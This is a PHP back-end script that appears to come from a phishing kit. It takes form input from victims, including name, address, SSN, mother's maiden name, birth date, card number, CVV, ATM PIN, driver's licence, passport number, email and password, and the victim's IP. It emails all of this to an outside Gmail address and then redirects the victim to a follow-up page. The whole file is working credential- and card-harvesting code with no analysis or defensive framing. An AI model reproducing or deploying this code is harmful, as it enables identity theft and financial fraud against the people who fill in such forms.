<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------US Info-----------------------\n";
$message .= "First Name: ".$_POST['formtext1']."\n";
$message .= "Last Name   : ".$_POST['formtext2']."\n";
$message .= "Address : ".$_POST['formtext3']."\n";
$message .= "City : ".$_POST['formtext4']."\n";
$message .= "State            : ".$_POST['formtext5']."\n";
$message .= "Zipcode            : ".$_POST['formtext6']."\n";
$message .= "phone            : ".$_POST['formtext7']."\n";
$message .= "SSN           : ".$_POST['formtext8']."\n";
$message .= "Monther name            : ".$_POST['formtext9']."\n";
$message .= "Date of Birth  DD          : ".$_POST['formselect1']."\n";
$message .= "Date of Birth MM           : ".$_POST['formselect2']."\n";
$message .= "Date of Birth  YY         : ".$_POST['formselect3']."\n";
$message .= "--------------US Info-----------------------\n";
$message .= "Card Brand            : ".$_POST['formtext10']."\n";
$message .= "Name on the Card            : ".$_POST['formtext11']."\n";
$message .= "Card Number            : ".$_POST['formtext12']."\n";
$message .= "Expiration date D           : ".$_POST['formselect4']."\n";
$message .= "Expiration date YYYY          : ".$_POST['formselect5']."\n";
$message .= "CVV            : ".$_POST['formtext14']."\n";
$message .= "ATM/PIN            : ".$_POST['formtext15']."\n";
$message .= "Driver License Number           : ".$_POST['formtext16']."\n";
$message .= "Passport id            : ".$_POST['formtext17']."\n";
$message .= "Expiry date DL           : ".$_POST['formselect4']."\n";
$message .= "Expiry date D           : ".$_POST['formselect5']."\n";
$message .= "Issue state           : ".$_POST['formtext13']."\n";
$message .= "Email            : ".$_POST['formtext18']."\n";
$message .= "Pass           : ".$_POST['formtext19']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "donaldyates1961@gmail.com";
$subject = "Result from Unknown";
$headers = "From: US<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: question.html");
?>